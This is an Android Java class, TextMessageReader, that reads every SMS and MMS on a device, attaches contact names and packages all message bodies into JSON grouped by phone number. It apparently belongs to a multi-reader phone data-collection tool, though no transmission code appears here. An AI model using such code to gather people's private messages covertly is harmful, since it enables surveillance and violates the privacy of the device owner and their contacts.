package net.scottjulian.lateralus.components.readers;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.text.MessageFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.Iterator;
import java.util.List;


public class TextMessageReader extends DataReader {

    private static final String TAG = "TextMessageReader";

    private static final String ROOT_KEY = "text_messages";
    private static final String CONTENT_SMS = "content://sms/";
    private static final String CONTENT_MMS = "content://mms/";
    private static final String CONTENT_MMS_PART = "content://mms/part/";

    private static final String PLAIN_TEXT  = "text/plain";
    private static final String UTF8        = "UTF-8";
    private static final String M_TYPE_SENT = "128";

    private static final String COL_ID      = "_id";
    private static final String COL_ADDRESS = "address";
    private static final String COL_DATE    = "date";
    private static final String COL_BODY    = "body";
    private static final String COL_TYPE    = "type";
    private static final String COL_TEXT    = "text";
    private static final String COL_M_TYPE  = "m_type";
    private static final String COL_CT      = "ct";
    private static final String COL_DATA    = "_data";

    public static final String KEY_NAME   = "name";
    public static final String KEY_NUMBER = "number";
    public static final String KEY_BODY   = "body";
    public static final String KEY_TYPE   = "type";
    public static final String KEY_TS     = "timestamp";
    public static final String KEY_SENT   = "sent";

    public TextMessageReader(Context ctx) {
        super(ctx);
    }

    @Override
    public JSONObject getData() {
        try{
            return new JSONObject().put(ROOT_KEY, combineMessageArraysByPhoneNumber(getSmsMessages(), getMmsMessages()));
        }
        catch(Exception e){
            Log.e(TAG, "Error getting SMS/MMS data!");
            e.printStackTrace();
        }
        return null;
    }

    @Override
    public String getRootKey() {
        return null;
    }

    //////// Helpers ////////

    private JSONObject combineMessageArraysByPhoneNumber(JSONArray msgs1, JSONArray msgs2){
        try{
            JSONObject root = new JSONObject();
            for(int x = 0; x < msgs1.length(); x++) {
                JSONObject m = msgs1.getJSONObject(x);
                String number = m.getString(KEY_NUMBER);
                if(root.has(number)){
                    root.getJSONArray(number).put(m);
                }
                else{
                    JSONArray numArray = new JSONArray();
                    numArray.put(m);
                    root.put(number, numArray);
                }
            }

            for(int y = 0; y < msgs2.length(); y++) {
                JSONObject m = msgs2.getJSONObject(y);
                String number = m.getString(KEY_NUMBER);
                if(root.has(number)){
                    root.getJSONArray(number).put(m);
                }
                else{
                    JSONArray numArray = new JSONArray();
                    numArray.put(m);
                    root.put(number, numArray);
                }
            }

            return sortMessagesByTimestamp(root);
        }
        catch(Exception e){
            Log.e(TAG, "Error sorting SMS/MMS by phone number!");
            e.printStackTrace();
        }
        return null;
    }

    private JSONObject sortMessagesByTimestamp(JSONObject messages){
        try {
            Iterator it = messages.keys();
            while(it.hasNext()) {
                String key = (String) it.next();
                if(messages.get(key) instanceof JSONArray) {
                    JSONArray msgsJsonArray = (JSONArray) messages.get(key);

                    // put messages (json objects) into an ArrayList
                    List<JSONObject> msgsList = new ArrayList<>();
                    for(int k = 0; k < msgsJsonArray.length(); k++){
                        msgsList.add(msgsJsonArray.getJSONObject(k));
                    }

                    // sort ArrayList by timestamp
                    Collections.sort(msgsList, new Comparator<JSONObject>() {
                        @Override
                        public int compare(JSONObject a, JSONObject b) {
                            try {
                                // oldest first, most recent last
                                return (a.getLong(KEY_TS) > b.getLong(KEY_TS)) ? 1 : -1;
                            }
                            catch(Exception e){
                                Log.e(TAG, "Error comparing messages!");
                                e.printStackTrace();
                            }
                            return 0;
                        }
                    });

                    // put messages (ArrayList) back into JSONObject
                    JSONArray msgsSorted = new JSONArray();
                    for(int j = 0; j < msgsList.size(); j++){
                        msgsSorted.put(msgsList.get(j));
                    }

                    // replace old JSONArray with new sorted JSONArray
                    messages.remove(key);
                    messages.put(key, msgsSorted);
                }
            }
        }
        catch(Exception e){
            Log.e(TAG, "Error sorting messages!");
            e.printStackTrace();
        }
        return messages;
    }

    //////// SMS ////////

    private JSONArray getSmsMessages(){
        JSONArray root = new JSONArray();
        try{
            Cursor cursor = _ctx.getContentResolver().query(Uri.parse(CONTENT_SMS), null, null, null, null);
            if(cursor.moveToFirst()) {
                do {
                    String phoneNumber = cursor.getString(cursor.getColumnIndex(COL_ADDRESS));
                    Boolean sent = (cursor.getInt(cursor.getColumnIndex(COL_TYPE)) == 2) ? true : false;
                    JSONObject textMsg = new JSONObject();
                    textMsg.put(KEY_NAME,  ContactReader.getContactName(_ctx, phoneNumber));
                    textMsg.put(KEY_NUMBER, PhonecallReader.parseNumber(phoneNumber));
                    textMsg.put(KEY_BODY, cursor.getString(cursor.getColumnIndex(COL_BODY)));
                    textMsg.put(KEY_TYPE, "sms");
                    textMsg.put(KEY_TS, cursor.getLong(cursor.getColumnIndex(COL_DATE)));
                    textMsg.put(KEY_SENT, sent);
                    root.put(textMsg);
                }
                while(cursor.moveToNext());
                cursor.close();
            }
            return root;
        }
        catch(Exception e){
            Log.e(TAG, "Error gathering/creating SMS data!");
            e.printStackTrace();
        }
        return null;
    }


    //////// MMS ////////

    private JSONArray getMmsMessages(){
        JSONArray root = new JSONArray();
        try{
            Cursor cursor = _ctx.getContentResolver().query(Uri.parse(CONTENT_MMS), null, null, null, null);
            if(cursor.moveToFirst()) {
                do {
                    String pid = cursor.getString(cursor.getColumnIndex(COL_ID));
                    long timestamp = cursor.getLong(cursor.getColumnIndex(COL_DATE)) * 1000; // wtf google
                    Boolean sent = (cursor.getString(cursor.getColumnIndex(COL_M_TYPE)).equals(M_TYPE_SENT)) ? true : false;
                    JSONObject mms = extractMms(pid, timestamp, sent);
                    if(mms != null) {
                        root.put(mms);
                    }
                }
                while(cursor.moveToNext());
                cursor.close();
            }

            return root;
        }
        catch(Exception e){
            Log.e(TAG, "Error gathering/creating MMS data!");
            e.printStackTrace();
        }
        return null;
    }

    private JSONObject extractMms(String pid, long timestamp, Boolean sent){
        String selectionPart = "mid=" + pid;
        Cursor cursor = _ctx.getContentResolver().query(Uri.parse(CONTENT_MMS_PART), null, selectionPart, null, null);
        String number = PhonecallReader.parseNumber(getMmsAddress(pid));
        String name = ContactReader.getContactName(_ctx, number);
        String body = "";

        if (cursor.moveToFirst()) {
            do {
                String partId = cursor.getString(cursor.getColumnIndex(COL_ID));
                String ct_type = cursor.getString(cursor.getColumnIndex(COL_CT));
                if (PLAIN_TEXT.equals(ct_type)) {
                    if (cursor.getString(cursor.getColumnIndex(COL_DATA)) != null) {
                        body = getMmsText(partId);
                    }
                    else {
                        body = cursor.getString(cursor.getColumnIndex(COL_TEXT));
                    }
                }
            }
            while (cursor.moveToNext());
            cursor.close();
        }

        if(!number.isEmpty() && !body.isEmpty()) {
            JSONObject textMessage = new JSONObject();
            try{
                textMessage.put(KEY_NAME, name);
                textMessage.put(KEY_NUMBER, number);
                textMessage.put(KEY_BODY, body);
                textMessage.put(KEY_TYPE, "mms");
                textMessage.put(KEY_TS, timestamp);
                textMessage.put(KEY_SENT, sent);
                return textMessage;
            }
            catch(Exception e){
                Log.e(TAG, "Error creating extracted MMS data!");
                e.printStackTrace();
            }
        }
        return null;
    }

    private String getMmsText(String partId){
        InputStream is = null;
        StringBuilder builder = new StringBuilder();
        try {
            is = _ctx.getContentResolver().openInputStream(Uri.parse(CONTENT_MMS_PART + partId));
            if (is != null) {
                InputStreamReader isr = new InputStreamReader(is, UTF8);
                BufferedReader reader = new BufferedReader(isr);
                String temp = reader.readLine();
                while (temp != null) {
                    builder.append(temp);
                    temp = reader.readLine();
                }
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        finally {
            if (is != null) {
                try {
                    is.close();
                }
                catch (IOException e) {
                    // do nothing
                }
            }
        }
        return builder.toString();
    }

    public String getMmsAddress(String partId) {
        String addrSelection = "type=137 AND msg_id=" + partId;
        String[] columns = { COL_ADDRESS };
        Cursor cursor = _ctx.getContentResolver().query(
                Uri.parse(MessageFormat.format(CONTENT_MMS + "{0}/addr", partId)),
                columns,
                addrSelection,
                null,
                null);
        String address = "";
        String val;
        if (cursor.moveToFirst()) {
            do {
                val = cursor.getString(cursor.getColumnIndex(COL_ADDRESS));
                if (val != null && !val.equals("insert-address-token")) {
                    address = val;
                    break;
                }
            }
            while (cursor.moveToNext());
            cursor.close();
        }
        return address.replaceAll("[^0-9]", "");
    }
}
